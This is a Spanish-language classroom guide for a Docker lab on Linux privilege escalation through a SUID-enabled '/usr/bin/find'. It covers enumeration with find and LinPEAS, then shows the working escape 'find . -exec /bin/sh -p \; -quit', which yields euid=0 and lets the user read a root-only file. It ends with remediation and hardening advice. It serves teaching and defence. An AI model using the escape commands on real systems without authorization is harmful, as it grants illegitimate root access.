# Guía de Demostración Práctica: Escalamiento de Privilegios en Linux
## Caso 1: Abuso de Binario con Bit SUID (`/usr/bin/find`)

Esta guía complementa la presentación y el documento teórico (*Escalamiento de Privilegios - Teoría y Casos Prácticos*). Está diseñada para que puedas ejecutar y explicar la demostración práctica paso a paso frente a la clase en un entorno Docker completamente aislado y seguro.

---

## 1. Fundamentos Teóricos y Respuestas a tus Dudas

### ¿Es correcto buscar con una herramienta y luego consultar el "registro público"?
**Sí, es exactamente la metodología estándar en auditorías de seguridad y ethical hacking.** Sin embargo, es clave precisar los conceptos para tu exposición:

1. **La herramienta de detección (Enumeración):**
   - En Linux, se utiliza **LinPEAS** (*Linux Privilege Escalation Awesome Script*) o comandos nativos del sistema como `find / -perm -4000 2>/dev/null`.
   - LinPEAS es un script de solo lectura: audita el sistema operativo, revisa configuraciones débiles, permisos y binarios con SUID/SGID, y resalta automáticamente en colores los puntos críticos.
2. **El "registro público" (GTFOBins):**
   - No es una base de datos de exploits binarios o malware (como lo sería Exploit-DB para CVEs específicos).
   - **GTFOBins** (`gtfobins.github.io`) es un catálogo público de binarios legítimos de Unix que documenta qué parámetros o funciones nativas de cada programa permiten romper el aislamiento (por ejemplo, abrir una consola o leer archivos del sistema) cuando se configuran erróneamente con privilegios elevados (`SUID` o reglas de `sudo`).

### ¿Por qué se produce esta vulnerabilidad?
* **El bit SUID (*Set User ID*):** Permite que un ejecutable corra con los privilegios de su **dueño** (en este caso `root`) en lugar de los privilegios del usuario que lo lanza.
* **El error de configuración:** Binarios como `passwd` necesitan legítimamente SUID para que un usuario común pueda modificar `/etc/shadow`. Pero si un administrador le asigna SUID a un binario que cuenta con capacidades nativas de ejecución de comandos externos (como `find` con su parámetro `-exec`, o editores como `vim`), cualquier usuario local puede instruir al binario privilegiado para que lance una shell, heredando los permisos de `root`.
* **UID Real (RUID) vs. UID Efectivo (EUID):** Al ejecutar un binario SUID de root, el usuario real sigue siendo `alumno` (`ruid=1000`), pero el usuario con el que el kernel evalúa los permisos es `root` (`euid=0`).

---

## 2. Herramientas Instaladas en el Contenedor

El contenedor Docker ya viene aprovisionado con todo lo necesario para la demo sin necesidad de conexión a internet:

| Herramienta | Ubicación | Función en la Demo |
| :--- | :--- | :--- |
| **`find` (modificado)** | `/usr/bin/find` | Binario vulnerable configurado con permisos `-rwsr-xr-x` (SUID de root). |
| **`linpeas.sh`** | `/home/alumno/linpeas.sh` | Script de enumeración automatizada que detecta vectores de escalamiento. |
| **Utilidades base** | `/bin/bash`, `/bin/sh`, `vim`, `file`, `procps` | Entorno estándar de administración Linux. |
| **Archivo objetivo** | `/root/prueba_admin.txt` | Archivo protegido (permisos `600`) usado para verificar acceso de root. |

---

## 3. Instrucciones de Despliegue del Laboratorio

### Paso 0: Iniciar Docker Desktop
Asegúrate de que la aplicación **Docker Desktop** esté abierta y en ejecución en tu Mac.

### Paso 1: Compilar e ingresar al contenedor
Desde la terminal en el directorio del proyecto (`/Users/filipoardenghi/Documents/5A1C/Ciber/TP1`), ejecuta:

```bash
./run-lab.sh
```

*(Alternativamente con Docker Compose: `docker compose run --rm lab`)*

Verás el prompt de la terminal del laboratorio:
```text
alumno@lab:~$
```

---

## 4. Guion Paso a Paso para la Exposición

### Etapa 1: Establecer la Línea Base (Identidad Inicial)
**Qué decir a la clase:**
> *"Comenzamos en la piel de un usuario común (`alumno`) que ha obtenido acceso inicial al sistema. Verifiquemos nuestros privilegios e identidad."*

**Comandos a ejecutar:**
```bash
whoami
id
```
**Qué mostrar en pantalla:**
- Usuario: `alumno`
- `uid=1000(alumno) gid=1000(alumno) groups=1000(alumno)`
- Intentar leer el archivo sensible del administrador para demostrar la falta de permisos:
  ```bash
  cat /root/prueba_admin.txt
  ```
  *(Salida esperada: `cat: /root/prueba_admin.txt: Permission denied`)*

---

### Etapa 2: Enumeración Manual (Búsqueda de Binarios SUID)
**Qué decir a la clase:**
> *"En la metodología de escalamiento, el 90% del esfuerzo es la enumeración. Vamos a inspeccionar el sistema buscando todos los archivos que tengan activo el bit SUID (`4000`)."*

**Comando a ejecutar:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Explicación de los parámetros para la clase:**
- `/`: Busca recursivamente desde la raíz de todo el disco.
- `-perm -4000`: Filtra únicamente los archivos que tengan el bit SUID activado.
- `-type f`: Filtra solo archivos regulares (descarta directorios o sockets).
- `2>/dev/null`: Redirige los errores de permisos (*stderr*) a `/dev/null` para que la salida sea limpia y no llene la pantalla de advertencias.

**Análisis de la salida:**
- Binarios normales y esperados: `/usr/bin/passwd`, `/usr/bin/su`, `/usr/bin/mount`.
- **Anomalía encontrada:** `/usr/bin/find`.
- Inspeccionar los permisos detallados:
  ```bash
  ls -l /usr/bin/find
  ```
  Se observará `-rwsr-xr-x 1 root root ...`. Destaca la letra **`s`** en el bloque de permisos del dueño, lo que indica que se ejecutará como `root`.

---

### Etapa 3: Enumeración Automatizada con LinPEAS
**Qué decir a la clase:**
> *"La enumeración manual es precisa pero requiere conocer qué binarios son normales y cuáles no. En auditorías reales utilizamos LinPEAS. Internamente, LinPEAS tiene una base de datos de binarios conocidos de GTFOBins. Al escanear los SUID, si detecta un binario peligroso, lo resalta con su máxima alerta visual: texto rojo sobre fondo amarillo."*

**Comando a ejecutar en la demo (rápido y enfocado):**
```bash
./linpeas.sh -o interesting_perms_files
```
*(Tip para la presentación: el parámetro `-o interesting_perms_files` corre únicamente la sección de permisos y SUID en 2 segundos, evitando esperar el escaneo de todo el sistema).*

**Qué señalar en la pantalla a la clase:**
1. **La leyenda de colores de LinPEAS al inicio:**
   - `RED/YELLOW: 95% a PE vector` (Rojo con fondo amarillo: 95% de certeza de escalamiento de privilegios).
2. **La sección `SUID - Check easy privesc, exploits and write perms`:**
   - Verás binarios estándar como `/usr/bin/passwd` o `/usr/bin/su` en texto normal.
   - **`/usr/bin/find` aparece destacado en ROJO con FONDO AMARILLO brillante (`RED/YELLOW`)**.
3. **El salto a GTFOBins:**
   - Explicar: *"LinPEAS no nos da el comando servido en bandeja ni escribe la palabra 'gtfobins' en cada línea, sino que nos enciende la alarma visual de que `/usr/bin/find` es abusable. Con este dato, el auditor va al catálogo público de **GTFOBins** (`gtfobins.github.io`), busca `find` en la categoría SUID y obtiene la técnica de escape."*

---

### Etapa 4: Explotación Didáctica (El Rol Crítico de `-p`)
En este punto es donde brilla la parte técnica y pedagógica recomendada en tu presentación:

#### Sub-paso 4A: El fallo didáctico (Ejecución sin `-p`)
**Qué decir a la clase:**
> *"Sabemos que `find` tiene la opción `-exec` para correr comandos sobre los resultados. Si intentamos abrir una shell directamente con `find . -exec /bin/sh \; -quit`, observemos qué sucede."*

**Comando:**
```bash
find . -exec /bin/sh \; -quit
```
Dentro de la subshell generada, escribe:
```bash
id
```
**Resultado observado:**
- Sigue mostrando `uid=1000(alumno) gid=1000(alumno)`.
- Salir de esta shell:
  ```bash
  exit
  ```
**Explicación teórica:**
- Las shells modernas como `bash` y `sh` (`dash`) tienen un mecanismo de seguridad integrado: si detectan que el usuario real (`ruid`) no coincide con el usuario efectivo (`euid`), **por defecto descartan los privilegios y degradan la ejecución al usuario real**.

#### Sub-paso 4B: La ejecución correcta (Modo Privilegiado con `-p`)
**Qué decir a la clase:**
> *"Para que la shell no descarte los privilegios heredados del proceso padre SUID, debemos pasarle el flag `-p` (modo privilegiado)."*

**Comando:**
```bash
find . -exec /bin/sh -p \; -quit
```
*(También funciona con `/bin/bash -p`: `find . -exec /bin/bash -p \; -quit`)*

Dentro de la nueva shell:
```bash
id
```
**Resultado observado:**
- `uid=1000(alumno) euid=0(root) ...`
- ¡El `euid=0` demuestra que el proceso tiene plenas capacidades de superusuario (`root`)!

#### Sub-paso 4C: Demostración de impacto
Verificar que ahora sí podemos acceder a los archivos protegidos del sistema:
```bash
cat /root/prueba_admin.txt
```
*(Salida esperada: `CONFIDENCIAL: Demostración exitosa de escalamiento de privilegios (Caso 1 - SUID)`)*

Para volver a la sesión de alumno:
```bash
exit
```

---

### Etapa 5: Remediación y Hardening (La Perspectiva Defensiva)
**Qué decir a la clase:**
> *"En ciberseguridad, entender el ataque sirve para diseñar la defensa. ¿Cómo corregimos este fallo?"*

**1. Corrección inmediata (remover el bit SUID):**
Siendo administradores (o simulando la acción del sysadmin):
```bash
# Como root o administrador:
chmod u-s /usr/bin/find
```
*(Dentro del contenedor, si ya escalaste a root con `-p`, puedes ejecutarlo directamente).*

**2. Verificación de la remediación:**
```bash
ls -l /usr/bin/find
```
- El permiso pasa de `-rwsr-xr-x` a `-rwxr-xr-x` (la `s` desaparece).
- Si el usuario `alumno` intenta nuevamente:
  ```bash
  find . -exec /bin/sh -p \; -quit
  id
  ```
  El resultado será `uid=1000(alumno)` sin privilegios elevados.

**3. Recomendaciones de arquitectura y hardening:**
- **Principio de menor privilegio:** Ningún binario con capacidades de escape o ejecución de subprocesos (`find`, `vim`, `nano`, `python`, `gdb`, `tar`) debe tener el bit SUID asignado.
- **Linux Capabilities (`setcap`):** En lugar de otorgar privilegios completos de root mediante SUID, utilizar *capabilities* específicas (por ejemplo, `cap_net_bind_service` para abrir puertos privilegiados sin necesidad de UID 0).
- **Montaje con `nosuid`:** Particiones donde los usuarios tienen permisos de escritura (como `/tmp` o `/home`) deben montarse con la opción `nosuid` en `/etc/fstab` para evitar que se ejecuten binarios SUID plantados.
- **Auditoría periódica:** Establecer tareas de monitoreo de integridad (como `AIDE` o scripts diarios) que alerten sobre la aparición de binarios SUID no autorizados frente a una lista blanca (*baseline*).

---

## 5. Resumen de Comandos Rápidos para la Demo

```text
1. Línea base:       id
2. Intento fallido:  cat /root/prueba_admin.txt
3. Enumeración:      find / -perm -4000 -type f 2>/dev/null
4. Auditoría LinPEAS:./linpeas.sh -o interesting_perms_files
5. Detalle permisos: ls -l /usr/bin/find
6. Demo sin -p:      find . -exec /bin/sh \; -quit  ->  id (sigue 1000) -> exit
7. Demo con -p:      find . -exec /bin/sh -p \; -quit  ->  id (euid=0)
8. Prueba de root:   cat /root/prueba_admin.txt
9. Hardening:        chmod u-s /usr/bin/find
```
